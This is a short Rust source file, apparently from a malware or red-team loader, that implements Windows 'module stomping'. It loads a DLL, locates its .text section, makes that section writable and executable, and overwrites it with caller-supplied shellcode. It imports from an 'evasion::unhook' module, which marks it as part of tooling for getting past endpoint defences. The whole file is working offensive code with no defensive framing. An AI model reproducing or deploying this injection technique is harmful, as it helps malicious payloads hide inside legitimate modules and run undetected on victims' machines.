#[cfg(target_os = "windows")]
use windows_sys::Win32::System::{
    LibraryLoader::{LoadLibraryA, GetModuleHandleA},
    Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ},
};

#[cfg(target_os = "windows")]
pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8> {
    use crate::evasion::unhook::get_text_section;

    LoadLibraryA(dll_name.as_ptr());
    let module_base = GetModuleHandleA(dll_name.as_ptr()) as *mut u8;
    if module_base.is_null() { return None; }

    let (text_rva, text_size) = get_text_section(module_base as *const u8);
    if text_size < shellcode.len() { return None; }

    let target = module_base.add(text_rva);
    let mut old = 0u32;
    VirtualProtect(target as _, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old);
    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), target, shellcode.len());
    VirtualProtect(target as _, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    Some(target)
}
